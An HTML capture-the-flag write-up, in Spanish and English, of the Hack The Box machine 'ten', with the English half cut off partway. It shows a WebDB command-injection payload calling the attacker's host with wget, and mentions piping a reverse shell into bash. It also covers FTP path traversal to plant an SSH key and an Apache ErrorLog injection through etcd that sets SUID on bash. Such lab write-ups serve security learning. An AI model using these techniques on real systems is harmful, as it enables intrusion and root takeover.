@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ten | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">ten</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ========== ESPAÑOL ========== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina expone un servidor FTP (Pure-FTPd), SSH y un servidor web Apache. Una aplicación web permite registrar cuentas que provisiona automáticamente credenciales FTP y un virtual host personal. Al explorar los virtual hosts encontramos <strong>WebDB</strong>, un IDE de bases de datos que tiene acceso a la base de datos de Pure-FTPd y que contiene una vulnerabilidad de inyección de comandos en el parámetro <code>password</code> de su endpoint SSH.</p>
+
+                    <p>Sin embargo, la vía principal de acceso inicial pasa por abusar del propio WebDB para modificar el directorio home de nuestro usuario FTP mediante <strong>path traversal</strong>, apuntando directamente a <code>/home/tyrell/.ssh/</code> y cambiando el UID/GID al del usuario real del sistema. Esto nos permite descargar el fichero <code>authorized_keys</code> existente, añadir nuestra clave pública SSH y volver a subirlo, obteniendo acceso directo como <code>tyrell</code>.</p>
+
+                    <p>Una vez dentro, descubrimos que el sistema usa <strong>etcd</strong> como almacén de configuración y <strong>remco</strong> como proceso de automatización que genera ficheros de configuración de Apache a partir de plantillas. Remco observa la clave <code>/customers</code> en etcd y regenera el fichero de virtual hosts de Apache cada vez que detecta un cambio, reiniciando el servicio. Tenemos permisos de escritura en etcd, así que inyectamos una directiva <code>ErrorLog</code> maliciosa con un comando a ejecutar usando la sintaxis de <em>piped logging</em> de Apache. En el siguiente ciclo de watch, remco escribe la config, Apache la carga y ejecuta el comando como <code>root</code>, añadiendo el bit SUID a <code>/bin/bash</code> y dándonos acceso root completo.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Empezamos con un escaneo nmap para identificar los servicios expuestos en la máquina:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span> <span style="color:#e06c75;">SERVICE</span>  <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">21/tcp</span>  open  ftp      Pure-FTPd
+<span style="color:#98c379;">22/tcp</span>  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 13:98:54:52:d3:7b:ae:32:6a:33:6f:18:a3:5a:27:66 (ECDSA)
+|_  256 2e:d5:86:25:c1:6b:0e:51:a2:2a:dd:82:44:a6:00:63 (ED25519)
+<span style="color:#98c379;">80/tcp</span>  open  http     Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Page moved.
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Tenemos FTP en el puerto 21, SSH en el 22 y Apache en el 80. Intento conectarme al FTP de forma anónima o con credenciales por defecto:</p>
+
+                <pre><code class="language-bash">ftp 10.129.234.158</code></pre>
+
+                <pre><code class="language-plaintext">Connected to 10.129.234.158.
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 50 allowed.
+220-Local time is now 10:37. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+Name (10.129.234.158:asd): asd
+331 User asd OK. Password required
+Password:
+530 Login authentication failed</code></pre>
+
+                <p>El FTP está securizado y no acepta login anónimo. Vale la pena notar que el banner indica que se aceptan conexiones IPv6, detalle que podría ser relevante más adelante. Pasamos a enumerar la web.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Haciendo fuzzing sobre la web del puerto 80 encuentro los siguientes ficheros relevantes:</p>
+
+                <pre><code class="language-plaintext">200 GET   http://10.129.234.158/attribution.php
+200 GET   http://10.129.234.158/signup.php
+200 GET   http://10.129.234.158/info.php
+200 GET   http://10.129.234.158/index.php
+200 GET   http://10.129.234.158/index.html
+http://10.129.234.158/get-credentials-please-do-not-spam-this-thanks.php => signup.php</code></pre>
+
+                <p>En <code>/info.php</code> hay una salida completa de <code>phpinfo()</code>, que me revela información útil: la web reside en <code>/var/www/html/</code> y veo que el servidor tiene asociado el dominio <code>ten.vl</code>, que añado a mi <code>/etc/hosts</code>.</p>
+
+                <h3>Registro de cuenta y provisión automática de FTP</h3>
+                <p>La página <code>/signup.php</code> me llama la atención: muestra un formulario de registro.</p>
+
+                <img src="./media/image1.png" alt="Formulario de registro en signup.php con un campo de nombre de usuario" />
+
+                <p>Al enviar el formulario, la petición va a <code>/get-credentials-please-do-not-spam-this-thanks.php</code>. Tras unos segundos, recibo la respuesta:</p>
+
+                <pre><code class="language-plaintext">Your personal account is ready to be used:
+
+Username: ten-3e21f664
+Password: cbea4bb0
+Personal Domain: asd.ten.vl
+
+You can use the provided credentials to upload your pages via ftp://ten.vl.</code></pre>
+
+                <p>El sistema ha provisionado automáticamente unas credenciales FTP y un virtual host personal en <code>asd.ten.vl</code>. Me conecto al FTP con estas credenciales y compruebo el virtual host, que tiene directory listing activo. La web incluye un aviso relevante:</p>
+
+                <blockquote>
+                    <p>"we allow old-school static HTML pages ONLY. Also we can't allow .htaccess files anymore - for obvious reasons."</p>
+                </blockquote>
+
+                <p>Intento subir una webshell PHP, pero el código PHP aparece comentado en la respuesta — el servidor no ejecuta PHP en estos virtual hosts. Intentar subir un <code>.htaccess</code> directamente también falla:</p>
+
+                <pre><code class="language-plaintext">553 Prohibited file name: .htaccess</code></pre>
+
+                <p>El FTP filtra este nombre de fichero explícitamente, así que este vector no tiene salida directa.</p>
+
+                <h2>Descubrimiento de Virtual Hosts — WebDB</h2>
+                <p>Ahora que sé que hay virtual hosting, hago fuzzing de subdominios sobre <code>ten.vl</code> y encuentro otro host además del mío:</p>
+
+                <pre><code class="language-plaintext">asd.ten.vl     Status: 200 [Size: 745]
+webdb.ten.vl   Status: 200 [Size: 1685]</code></pre>
+
+                <p>En <code>webdb.ten.vl</code> hay una instancia de <a href="https://github.com/WebDB-App/app">WebDB</a> (<a href="https://docs.webdb.app/">docs</a>), un IDE web para bases de datos. Al entrar, hay un botón de <em>guess credentials</em> que me loga automáticamente con:</p>
+
+                <pre><code class="language-plaintext">user : pa55w0rd</code></pre>
+
+                <p>Dentro veo la base de datos de Pure-FTPd con una tabla de usuarios. El registro de mi usuario muestra, entre otros campos, una columna <code>dir</code> con el valor <code>/srv/ten-3e21f664/./</code>, y columnas <code>uid</code> y <code>gid</code> con valores superiores a 22000. Esto significa que el directorio raíz del FTP es configurable directamente desde esta base de datos.</p>
+
+                <h2>Vulnerabilidad RCE en WebDB (vía alternativa)</h2>
+                <p>Antes de explotar la vía de path traversal, investigo el código fuente de WebDB. Encuentro una función de sanitización de argumentos bash bastante deficiente:</p>
+
+                <pre><code class="language-javascript"><span style="color:#c678dd;">shellEscape</span>(arg, doubleQuoted = <span style="color:#d19a66;">false</span>) {
+  <span style="color:#c678dd;">if</span> (doubleQuoted) {
+    <span style="color:#c678dd;">return</span> arg.<span style="color:#61afef;">replace</span>(<span style="color:#98c379;">/(["])/g</span>, <span style="color:#98c379;">"\\$1"</span>);
+  }
+  <span style="color:#c678dd;">return</span> arg.<span style="color:#61afef;">replace</span>(<span style="color:#98c379;">/([$!'"();`*?{}[\]&lt;&gt;&amp;%#~@\\])/g</span>, <span style="color:#98c379;">"\\$1"</span>);
+}</code></pre>
+
+                <p>Cuando <code>doubleQuoted</code> es <code>true</code>, la función prácticamente no sanitiza nada — solo escapa comillas dobles. Esto es especialmente grave porque se usa en el endpoint <code>/api/server/connect</code> con el parámetro <code>password</code> de una conexión SSH:</p>
+
+                <pre><code class="language-javascript"><span style="color:#c678dd;">if</span> (connection.ssh.password) {
+  forward = <span style="color:#c678dd;">await</span> bash.<span style="color:#61afef;">runBash</span>(
+    <span style="color:#98c379;">`sshpass -p "<span style="color:#e06c75;">${bash.shellEscape(connection.ssh.password, true)}</span>" ${common} ${uri}`</span>
+  );
+}</code></pre>
+
+                <p>El payload viaja dentro de un objeto JSON en el cuerpo de la petición al endpoint:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"ssh"</span>: {
+    <span style="color:#e06c75;">"port"</span>: <span style="color:#d19a66;">22</span>,
+    <span style="color:#e06c75;">"user"</span>: <span style="color:#98c379;">"paco"</span>,
+    <span style="color:#e06c75;">"host"</span>: <span style="color:#98c379;">"localhost"</span>,
+    <span style="color:#e06c75;">"password"</span>: <span style="color:#98c379;">"`wget 10.10.14.142`"</span>
+  }
+}</code></pre>
+
+                <p>Estando en escucha en el puerto 80 recibo un hit inmediatamente, confirmando la ejecución de comandos:</p>
+
+                <pre><code class="language-plaintext">10.129.234.158 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Cambiando el payload por una reverse shell descargada y ejecutada al vuelo, consigo una shell como <code>root</code> en un contenedor. No obstante, el entorno es un contenedor con poco contenido relevante — esta parece ser una vía alternativa, no la principal.</p>
+
+                <h2>Acceso Inicial — Path Traversal FTP + Inyección en authorized_keys</h2>
+                <p>Volviendo a la base de datos de WebDB, pruebo a modificar la columna <code>dir</code> del usuario FTP directamente desde el IDE. Al intentar apuntar a un directorio arbitrario me aparece el siguiente error:</p>
+
+                <img src="./media/image2.png" alt="Error de WebDB al intentar modificar el campo dir con una ruta arbitraria" />
+
+                <p>Sin embargo, usando path traversal con el valor <code>/srv/.././</code> el cambio se acepta. Ahora cuando me conecto por FTP puedo navegar desde la raíz del sistema de ficheros. Con <code>cd</code> y lectura de ficheros puedo confirmar la existencia del usuario <code>tyrell</code>:</p>
+
+                <pre><code class="language-plaintext">tyrell:x:1000:1000:Tyrell W.:/home/tyrell:/bin/bash</code></pre>
+
+                <p>El siguiente paso es claro: modifico el campo <code>dir</code> a <code>/srv/../home/tyrell/.ssh</code> y cambio también el <code>uid</code> y <code>gid</code> al valor <code>1000</code> (el de tyrell). De esta forma el proceso FTP opera con la identidad del usuario real del sistema y tiene acceso a su directorio <code>.ssh</code>.</p>
+
+                <p>Al reconectar por FTP veo que hay un fichero <code>authorized_keys</code> con dos entradas. Lo descargo, añado mi clave pública SSH y lo vuelvo a subir:</p>
+
+                <pre><code class="language-bash"># Descargamos el authorized_keys existente
+get authorized_keys
+
+# Añadimos nuestra clave pública al fichero
+echo "ssh-ed25519 AAAA...mi_clave_publica..." >> authorized_keys
+
+# Lo subimos de vuelta
+put authorized_keys</code></pre>
+
+                <p>Ahora me conecto directamente por SSH como <code>tyrell</code> y obtengo la flag de usuario.</p>
+
+                <pre><code class="language-bash">ssh tyrell@10.129.234.158</code></pre>
+
+                <h2>Enumeración Post-Acceso — etcd y remco</h2>
+                <p>Dentro de la máquina, enumero los puertos TCP internos:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  127.0.0.1:2380   (etcd peer)
+tcp  LISTEN  127.0.0.1:2379   (etcd client)
+tcp  LISTEN  127.0.0.1:3306   (MySQL)
+tcp  LISTEN  127.0.0.1:22071
+tcp  LISTEN  127.0.0.1:4001</code></pre>
+
+                <p>Revisando <code>ps -fauxww</code> veo que hay contenedores en marcha y que se está usando <strong>etcd</strong>, un almacén key-value distribuido típicamente usado en clústeres como Kubernetes (<a href="https://etcd.io/">https://etcd.io/</a>). También veo este proceso que no reconozco de inmediato:</p>
+
+                <pre><code class="language-plaintext">root   987  0.0  0.6  733880  24956  ?  Ssl  0:05  /usr/local/sbin/remco</code></pre>
+
+                <p>Investigo <code>remco</code>:</p>
+
+                <pre><code class="language-bash">remco --help</code></pre>
+
+                <pre><code class="language-plaintext">Usage of remco:
+  -config string
+        path to the configuration file (default "/etc/remco/config")
+  -onetime
+        run templating process once and exit
+  -version
+        print version and exit</code></pre>
+
+                <p>Es una herramienta de gestión de configuración basada en plantillas que puede observar backends de clave-valor como etcd. Leo su configuración:</p>
+
+                <pre><code class="language-bash">cat /etc/remco/config</code></pre>
+
+                <pre><code class="language-toml"><span style="color:#e06c75;">log_level</span> = <span style="color:#98c379;">"info"</span>
+<span style="color:#e06c75;">log_format</span> = <span style="color:#98c379;">"text"</span>
+
+[[resource]]
+<span style="color:#e06c75;">name</span> = <span style="color:#98c379;">"apache2"</span>
+
+  [[resource.template]]
+  <span style="color:#e06c75;">src</span>        = <span style="color:#98c379;">"/etc/remco/templates/010-customers.conf.tmpl"</span>
+  <span style="color:#e06c75;">dst</span>        = <span style="color:#98c379;">"/etc/apache2/sites-enabled/010-customers.conf"</span>
+  <span style="color:#e06c75;">reload_cmd</span> = <span style="color:#98c379;">"systemctl restart apache2.service"</span>
+
+  [resource.backend]
+    [resource.backend.etcd]
+    <span style="color:#e06c75;">version</span>   = <span style="color:#d19a66;">3</span>
+    <span style="color:#e06c75;">nodes</span>     = [<span style="color:#98c379;">"http://127.0.0.1:2379"</span>]
+    <span style="color:#e06c75;">keys</span>      = [<span style="color:#98c379;">"/customers"</span>]
+    <span style="color:#e06c75;">watch</span>     = <span style="color:#d19a66;">true</span>
+    <span style="color:#e06c75;">interval</span>  = <span style="color:#d19a66;">5</span></code></pre>
+
+                <p>Y la plantilla que usa:</p>
+
+                <pre><code class="language-bash">cat /etc/remco/templates/010-customers.conf.tmpl</code></pre>
+
+                <pre><code class="language-django"><span style="color:#c678dd;">{% for</span> customer <span style="color:#c678dd;">in</span> <span style="color:#61afef;">lsdir</span>(<span style="color:#98c379;">"/customers"</span>) <span style="color:#c678dd;">%}</span>
+<span style="color:#c678dd;">{% if</span> <span style="color:#61afef;">exists</span>(<span style="color:#61afef;">printf</span>(<span style="color:#98c379;">"/customers/%s/url"</span>, customer)) <span style="color:#c678dd;">%}</span>
+&lt;VirtualHost *:80&gt;
+    ServerName <span style="color:#c678dd;">{{</span> <span style="color:#61afef;">getv</span>(<span style="color:#61afef;">printf</span>(<span style="color:#98c379;">"/customers/%s/url"</span>,customer)) <span style="color:#c678dd;">}}</span>.ten.vl
+    DocumentRoot /srv/<span style="color:#c678dd;">{{</span> customer <span style="color:#c678dd;">}}</span>/
+&lt;/VirtualHost&gt;
+<span style="color:#c678dd;">{% endif %}</span>
+<span style="color:#c678dd;">{% endfor %}</span></code></pre>
+
+                <p>El flujo es el siguiente: remco observa el prefijo <code>/customers</code> en etcd. Cada vez que detecta un cambio, renderiza la plantilla generando un fichero de virtual hosts de Apache en <code>/etc/apache2/sites-enabled/010-customers.conf</code> y después ejecuta <code>systemctl restart apache2.service</code> como <code>root</code>. Es efectivamente un proceso privilegiado cíclico — similar a un cron job.</p>
+
+                <p>Verifico que puedo leer y escribir en etcd:</p>
+
+                <pre><code class="language-bash">ETCDCTL_API=3 etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix</code></pre>
+
+                <pre><code class="language-plaintext">/customers/ten-3e21f664/url
+asd</code></pre>
+
+                <h2>Escalada de Privilegios — Inyección de directiva ErrorLog en Apache</h2>
+                <p>La clave del ataque es que el valor de la URL del cliente se inserta directamente en la plantilla sin ningún tipo de sanitización. Esto nos permite romper el bloque <code>&lt;VirtualHost&gt;</code> e inyectar directivas de Apache arbitrarias.</p>
+
+                <p>Primero hago pruebas con <code>CustomLog</code> usando la <a href="https://httpd.apache.org/docs/2.4/logs.html#piped">sintaxis de piped logging</a> de Apache, pero me rompe los virtual hosts y el comando no se ejecuta. Pruebo entonces con <code>ErrorLog</code>, que también soporta piped logging según la <a href="https://httpd.apache.org/docs/2.4/mod/core.html#errorlog">documentación oficial</a>, y funciona.</p>
+
+                <p>Inyecto una directiva <code>ErrorLog</code> que llama a <code>chmod</code> para añadir el bit SUID a <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">ETCDCTL_API=3 etcdctl --endpoints=http://127.0.0.1:2379 put /customers/ten-erwerw/url 'xdd.ten.vl
+ErrorLog "|/usr/bin/chmod u+s /usr/bin/bash"
+#'</code></pre>
+
+                <p>Tras el siguiente ciclo de watch de remco (máximo 5 segundos), el fichero de configuración generado queda así:</p>
+
+                <pre><code class="language-apacheconf"><span style="color:#e06c75;">&lt;VirtualHost</span> <span style="color:#d19a66;">*:80</span><span style="color:#e06c75;">&gt;</span>
+    <span style="color:#61afef;">ServerName</span> xdd.ten.vl
+    <span style="color:#61afef;">ErrorLog</span> <span style="color:#98c379;">"|/usr/bin/chmod u+s /usr/bin/bash"</span>
+    <span style="color:#e5c07b;">#</span>.ten.vl
+    <span style="color:#61afef;">DocumentRoot</span> /srv/ten-erwerw/
+<span style="color:#e06c75;">&lt;/VirtualHost&gt;</span></code></pre>
+
+                <p>Apache se reinicia con esta configuración, lo que provoca que ejecute el comando del <code>ErrorLog</code> como <code>root</code>. Compruebo el resultado:</p>
+
+                <pre><code class="language-bash">ls -lah /bin/bash</code></pre>
+
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1.4M Mar 14 2024 /bin/bash</code></pre>
+
+                <p>El bit SUID está activo. Ejecuto <code>bash</code> con el flag <code>-p</code> para preservar el UID efectivo y obtener una shell root:</p>
+
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <pre><code class="language-plaintext">bash-5.1# whoami
+root</code></pre>
+
+                <p>Acceso root conseguido. Recuperamos la flag del sistema.</p>
+            </div>
+
+            <!-- ========== ENGLISH ========== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The machine exposes FTP (Pure-FTPd), SSH, and an Apache web server. A web application allows registering accounts, which automatically provisions FTP credentials and a personal virtual host. Enumerating virtual hosts reveals <strong>WebDB</strong>, a database IDE with access to the Pure-FTPd database, which contains a command injection vulnerability in the <code>password</code> parameter of its SSH connection endpoint.</p>
+
+                    <p>However, the intended initial access vector involves abusing WebDB itself to modify the FTP user's home directory via <strong>path traversal</strong>, pointing it to <code>/home/tyrell/.ssh/</code> and changing the UID/GID to match the real system user. This lets us download the existing <code>authorized_keys</code> file, append our SSH public key, and re-upload it — gaining direct SSH access as <code>tyrell</code>.</p>
+
+                    <p>Once inside, we discover the system uses <strong>etcd</strong> as a configuration store and <strong>remco</strong> as an automation process that generates Apache configuration files from templates. Remco watches the <code>/customers</code> key in etcd and regenerates the Apache virtual hosts file every time it detects a change, restarting the service. Since we have write access to etcd, we inject a malicious <code>ErrorLog</code> directive with a piped command. On the next watch cycle, remco writes the config, Apache loads it, and executes our command as <code>root</code> — setting the SUID bit on <code>/bin/bash</code> and granting us full root access.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify services running on the target:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span> <span style="color:#e06c75;">SERVICE</span>  <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">21/tcp</span>  open  ftp      Pure-FTPd
+<span style="color:#98c379;">22/tcp</span>  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 13:98:54:52:d3:7b:ae:32:6a:33:6f:18:a3:5a:27:66 (ECDSA)
+|_  256 2e:d5:86:25:c1:6b:0e:51:a2:2a:dd:82:44:a6:00:63 (ED25519)
+<span style="color:#98c379;">80/tcp</span>  open  http     Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Page moved.
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>We have FTP on port 21, SSH on 22 and Apache on 80. Attempting anonymous FTP or default credentials:</p>
+
+                <pre><code class="language-bash">ftp 10.129.234.158</code></pre>
+
+                <pre><code class="language-plaintext">Connected to 10.129.234.158.
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 50 allowed.
+220-Local time is now 10:37. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+Name (10.129.234.158:asd): asd
+331 User asd OK. Password required
+Password:
+530 Login authentication failed</code></pre>
+
+                <p>FTP is locked down and anonymous login is not allowed. Worth noting: the banner advertises IPv6 support, which could be relevant later. Moving on to web enumeration.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Fuzzing the web server on port 80 reveals the following interesting files:</p>
+
+                <pre><code class="language-plaintext">200 GET   http://10.129.234.158/attribution.php
+200 GET   http://10.129.234.158/signup.php
+200 GET   http://10.129.234.158/info.php
+200 GET   http://10.129.234.158/index.php
+200 GET   http://10.129.234.158/index.html
+http://10.129.234.158/get-credentials-please-do-not-spam-this-thanks.php => signup.php</code></pre>
+
+                <p>At <code>/info.php</code>, there's a full <code>phpinfo()</code> output revealing useful details: the web root is <code>/var/www/html/</code>, and the server is associated with the domain <code>ten.vl</code>, which I add to my <code>/etc/hosts</code>.</p>
+
+                <h3>Account Registration and Automatic FTP Provisioning</h3>
+                <p>The <code>/signup.php</code> page presents a registration form:</p>
+
+                <img src="./media/image1.png" alt="Registration form on signup.php with a username input field" />
+
+                <p>Submitting the form sends the request to <code>/get-credentials-please-do-not-spam-this-thanks.php</code>. After about 10 seconds, we get:</p>
+
+                <pre><code class="language-plaintext">Your personal account is ready to be used:
+
+Username: ten-3e21f664
+Password: cbea4bb0
+Personal Domain: asd.ten.vl
+
+You can use the provided credentials to upload your pages via ftp://ten.vl.</code></pre>
+
+                <p>The system has automatically provisioned FTP credentials and a personal virtual host at <code>asd.ten.vl</code>. Connecting via FTP and visiting the virtual host shows directory listing is enabled. The site includes an interesting notice:</p>
+
+                <blockquote>
+                    <p>"we allow old-school static HTML pages ONLY. Also we can't allow .htaccess files anymore - for obvious reasons."</p>
+                </blockquote>
+
+                <p>Attempting to upload a PHP webshell fails — PHP code appears commented out in the response, meaning the server doesn't execute PHP in these virtual hosts. Trying to upload a <code>.htaccess</code> file directly also fails:</p>
+
+                <pre><code class="language-plaintext">553 Prohibited file name: .htaccess</code></pre>
+
+                <p>The FTP server explicitly filters this filename, so this vector is a dead end for now.</p>
+
+                <h2>Virtual Host Discovery — WebDB</h2>
+                <p>Now aware of virtual hosting, I fuzz for subdomains on <code>ten.vl</code> and find another host besides mine:</p>
+
+                <pre><code class="language-plaintext">asd.ten.vl     Status: 200 [Size: 745]
+webdb.ten.vl   Status: 200 [Size: 1685]</code></pre>
+
+                <p><code>webdb.ten.vl</code> hosts an instance of <a href="https://github.com/WebDB-App/app">WebDB</a> (<a href="https://docs.webdb.app/">docs</a>), a web-based database IDE. There's a "guess credentials" button that logs in automatically with:</p>
+
+                <pre><code class="language-plaintext">user : pa55w0rd</code></pre>
+
+                <p>Inside, I can see the Pure-FTPd database with a users table. My user's record has a <code>dir</code> column set to <code>/srv/ten-3e21f664/./</code>, and <code>uid</code>/<code>gid</code> columns with values over 22000. This means the FTP root directory is directly configurable from this database.</p>
+
+                <h2>WebDB Command Injection (Alternative Path)</h2>
+                <p>Before going down the path traversal route, I investigate WebDB's source code and find a poorly implemented bash argument sanitization function:</p>
+
+                <pre><code class="language-javascript"><span style="color:#c678dd;">shellEscape</span>(arg, doubleQuoted = <span style="color:#d19a66;">false</span>) {
+  <span style="color:#c678dd;">if</span> (doubleQuoted) {
+    <span style="color:#c678dd;">return</span> arg.<span style="color:#61afef;">replace</span>(<span style="color:#98c379;">/(["])/g</span>, <span style="color:#98c379;">"\\$1"</span>);
+  }
+  <span style="color:#c678dd;">return</span> arg.<span style="color:#61afef;">replace</span>(<span style="color:#98c379;">/([$!'"();`*?{}[\]&lt;&gt;&amp;%#~@\\])/g</span>, <span style="color:#98c379;">"\\$1"</span>);
+}</code></pre>
+
+                <p>When <code>doubleQuoted</code> is <code>true</code>, the function barely sanitizes anything — it only escapes double quotes. This is particularly dangerous because it's used in the <code>/api/server/connect</code> endpoint with the SSH <code>password</code> parameter:</p>
+
+                <pre><code class="language-javascript"><span style="color:#c678dd;">if</span> (connection.ssh.password) {
+  forward = <span style="color:#c678dd;">await</span> bash.<span style="color:#61afef;">runBash</span>(
+    <span style="color:#98c379;">`sshpass -p "<span style="color:#e06c75;">${bash.shellEscape(connection.ssh.password, true)}</span>" ${common} ${uri}`</span>
+  );
+}</code></pre>
+
+                <p>The payload goes in the JSON body of the request to the endpoint:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"ssh"</span>: {
+    <span style="color:#e06c75;">"port"</span>: <span style="color:#d19a66;">22</span>,
+    <span style="color:#e06c75;">"user"</span>: <span style="color:#98c379;">"paco"</span>,
+    <span style="color:#e06c75;">"host"</span>: <span style="color:#98c379;">"localhost"</span>,
+    <span style="color:#e06c75;">"password"</span>: <span style="color:#98c379;">"`wget 10.10.14.142`"</span>
+  }
+}</code></pre>
+
+                <p>With a listener on port 80, I receive an immediate hit confirming command execution:</p>
+
+                <pre><code class="language-plaintext">10.129.234.158 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Changing the payload to pipe a hosted reverse shell into bash yields a shell as <code>root</code> inside a container. However, the container environment contains nothing particularly interesting — this appears to be an unintended alternative path, not the main one.</p>
+
+                <h2>Initial Access — FTP Path Traversal + authorized_keys Injection</h2>
+                <p>Back in WebDB, I try modifying the <code>dir</code> column for my FTP user directly from the database IDE. Attempting an arbitrary path triggers the following error:</p>
+
+                <img src="./media/image2.png" alt="WebDB error when attempting to modify the dir field with an arbitrary path" />
+
+                <p>However, using path traversal with the value <code>/srv/.././</code> is accepted. Now when connecting via FTP I can navigate from the filesystem root. Using <code>cd</code> and reading files, I confirm the existence of user <code>tyrell</code>:</p>
+
+                <pre><code class="language-plaintext">tyrell:x:1000:1000:Tyrell W.:/home/tyrell:/bin/bash</code></pre>
+
+                <p>The next step is clear: I modify the <code>dir</code> field to <code>/srv/../home/tyrell/.ssh</code> and change <code>uid</code> and <code>gid</code> to <code>1000</code> (tyrell's values). This makes the FTP process operate with the real system user's identity, giving it access to their <code>.ssh</code> directory.</p>
+
+                <p>Reconnecting via FTP, I can see an <code>authorized_keys</code> file with two existing entries. I download it, append my SSH public key, and re-upload it:</p>
+
+                <pre><code class="language-bash"># Download the existing authorized_keys
+get authorized_keys
+
+# Append our public key
+echo "ssh-ed25519 AAAA...my_public_key..." >> authorized_keys
+
+# Upload it back
+put authorized_keys</code></pre>
+
+                <p>Now I can connect directly via SSH as <code>tyrell</code> and grab the user flag.</p>
+
+                <pre><code class="language-bash">ssh tyrell@10.129.234.158</code></pre>
+
+                <h2>Post-Access Enumeration — etcd and remco</h2>
+                <p>Inside the machine, I enumerate internally listening TCP ports:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  127.0.0.1:2380   (etcd peer)
+tcp  LISTEN  127.0.0.1:2379   (etcd client)
+tcp  LISTEN  127.0.0.1:3306   (MySQL)
+tcp  LISTEN  127.0.0.1:22071
+tcp  LISTEN  127.0.0.1:4001</code></pre>
+
+                <p>Reviewing <code>ps -fauxww</code>, I see containers running and <strong>etcd</strong> in use — a distributed key-value store typically used in clusters like Kubernetes (<a href="https://etcd.io/">https://etcd.io/</a>). There's also an unfamiliar process:</p>
+
+                <pre><code class="language-plaintext">root   987  0.0  0.6  733880  24956  ?  Ssl  0:05  /usr/local/sbin/remco</code></pre>
+
+                <p>Investigating <code>remco</code>:</p>
+
+                <pre><code class="language-bash">remco --help</code></pre>
+
+                <pre><code class="language-plaintext">Usage of remco:
+  -config string
+        path to the configuration file (default "/etc/remco/config")
+  -onetime
+        run templating process once and exit
+  -version
+        print version and exit</code></pre>
+
+                <p>It's a template-based configuration management tool that can watch key-value backends like etcd. Reading its configuration:</p>
+
+                <pre><code class="language-bash">cat /etc/remco/config</code></pre>
+
+                <pre><code class="language-toml"><span style="color:#e06c75;">log_level</span> = <span style="color:#98c379;">"info"</span>
+<span style="color:#e06c75;">log_format</span> = <span style="color:#98c379;">"text"</span>
+
+[[resource]]
+<span style="color:#e06c75;">name</span> = <span style="color:#98c379;">"apache2"</span>
+
+  [[resource.template]]
+  <span style="color:#e06c75;">src</span>        = <span style="color:#98c379;">"/etc/remco/templates/010-customers.conf.tmpl"</span>
+  <span style="color:#e06c75;">dst</span>        = <span style="color:#98c379;">"/etc/apache2/sites-enabled/010-customers.conf"</span>
+  <span style="color:#e06c75;">reload_cmd</span> = <span style="color:#98c379;">"systemctl restart apache2.service"</span>
+
+  [resource.backend]
+    [resource.backend.etcd]
+    <span style="color:#e06c75;">version</span>   = <span style="color:#d19a66;">3</span>
